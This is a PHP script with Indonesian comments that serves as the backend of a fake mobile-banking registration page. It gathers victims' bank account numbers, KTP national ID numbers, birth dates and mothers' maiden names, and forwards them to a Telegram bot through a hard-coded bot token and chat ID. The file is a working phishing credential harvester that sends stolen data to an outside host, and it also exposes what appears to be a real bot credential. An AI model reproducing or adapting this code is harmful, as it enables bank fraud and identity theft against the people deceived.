<?php
// Token API Bot Telegram
$token = '7909539545:AAHMcspeYAM5HajvT6rGvCCPHsf9W0KuVSU';
// Chat ID penerima pesan
$chat_id = '7225707577';

// Ambil data dari form
$nomor_rekening = $_POST['nomor_rekening'] ?? '';
$nomor_ktp = $_POST['nomor_ktp'] ?? '';
$tanggal_lahir = $_POST['tanggal_lahir'] ?? '';
$nama_ibu = $_POST['nama_ibu'] ?? '';

// Validasi data
if (strlen($nomor_rekening) !== 12 || !ctype_digit($nomor_rekening)) {
    echo "Nomor Rekening harus terdiri dari 12 digit angka.";
    exit;
}
if (strlen($nomor_ktp) !== 16 || !ctype_digit($nomor_ktp)) {
    echo "Nomor KTP harus terdiri dari 16 digit angka.";
    exit;
}
if (empty($tanggal_lahir)) {
    echo "Tanggal Lahir harus diisi.";
    exit;
}
if (empty($nama_ibu)) {
    echo "Nama Ibu Kandung harus diisi.";
    exit;
}

// Format pesan yang akan dikirim
$message = "📄 *Registrasi Mobile Banking*\n\n";
$message .= "🏦 Nomor Rekening: `$nomor_rekening`\n";
$message .= "🆔 Nomor KTP: `$nomor_ktp`\n";
$message .= "🎂 Tanggal Lahir: `$tanggal_lahir`\n";
$message .= "👩‍👦 Nama Ibu Kandung: `$nama_ibu`\n";

// Kirim pesan ke Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown',
];

$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data),
    ],
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Berikan respon ke pengguna
if ($result) {
    echo "Data berhasil dikirim ke Telegram!";
} else {
    echo "Gagal mengirim data ke Telegram.";
}
?>